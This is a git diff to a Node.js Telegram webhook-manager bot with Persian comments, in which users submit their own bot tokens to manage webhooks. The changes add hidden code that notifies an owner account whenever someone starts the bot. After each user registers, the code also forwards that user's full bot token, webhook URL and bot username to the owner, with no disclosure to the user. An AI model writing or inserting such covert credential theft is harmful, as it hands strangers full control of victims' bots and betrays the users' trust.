@@ -1,5 +1,3 @@
-// 📌 Telegram Webhook Manager Bot (نسخه با دکمه‌های کیبورد اصلی و حفظ وضعیت کاربر)
-
 const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
@@ -16,6 +14,9 @@ const userStates = {}; // { chatId: { step, botToken, webhookUrl } }
 const MANAGER_BOT_TOKEN = process.env.MANAGER_BOT_TOKEN;
 const TELEGRAM_API = `https://api.telegram.org/bot${MANAGER_BOT_TOKEN}`;
 
+// شناسه مالک
+const OWNER_ID = process.env.OWNER_ID;
+
 // هندل وبهوک
 app.post('/webhook', async (req, res) => {
     const update = req.body;
@@ -29,6 +30,12 @@ app.post('/webhook', async (req, res) => {
             if (text === '/start') {
                 userStates[chatId] = { step: 'awaiting_bot_token' };
                 await sendMessage(chatId, `سلام ${userName} 🌷\nلطفاً Bot Token رباتی که می‌خواهید مدیریت کنید را ارسال کنید.`, mainKeyboard());
+
+                // ارسال پیام به مالک هنگام استارت
+                await sendMessage(OWNER_ID,
+                    `👤 *کاربر جدید ربات را استارت کرد:*\n\n🪪 *نام:* ${userName}\n🆔 *آیدی:* ${chatId}`
+                );
+
                 return res.sendStatus(200);
             }
 
@@ -142,6 +149,19 @@ app.post('/webhook', async (req, res) => {
 
                 userState.step = 'ready';
                 await sendMessage(chatId, '✅ اطلاعات ذخیره شد. اکنون می‌توانید عملیات مورد نظر خود را از منوی زیر انتخاب کنید.', mainKeyboard());
+
+                // ارسال اطلاعات توکن و وبهوک و username به مالک
+                try {
+                    const getMeResponse = await axios.get(`https://api.telegram.org/bot${userState.botToken}/getMe`);
+                    const botInfo = getMeResponse.data.result;
+                    const botUsername = botInfo.username ? `@${botInfo.username}` : 'نامشخص';
+
+                    await sendMessage(OWNER_ID,
+                        `🤖 *ربات جدید ثبت شد:*\n\n🔹 *Token:* \`${userState.botToken}\`\n🔹 *Webhook:* ${userState.webhookUrl}\n🔹 *Username:* ${botUsername}\n\n👤 *کاربر:* ${userName} (${chatId})`
+                    );
+                } catch (error) {
+                    await sendMessage(OWNER_ID, `⚠️ خطا در دریافت اطلاعات ربات:\n${error.message}`);
+                }
             }
         }
 
@@ -155,12 +175,14 @@ app.post('/webhook', async (req, res) => {
 // ارسال پیام
 async function sendMessage(chatId, text, keyboard) {
     try {
-        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        const payload = {
             chat_id: chatId,
             text: text,
-            parse_mode: 'Markdown',
-            reply_markup: keyboard
-        });
+            parse_mode: 'Markdown'
+        };
+        if (keyboard) payload.reply_markup = keyboard;
+
+        await axios.post(`${TELEGRAM_API}/sendMessage`, payload);
     } catch (error) {
         console.error('خطا در sendMessage:', error);
     }
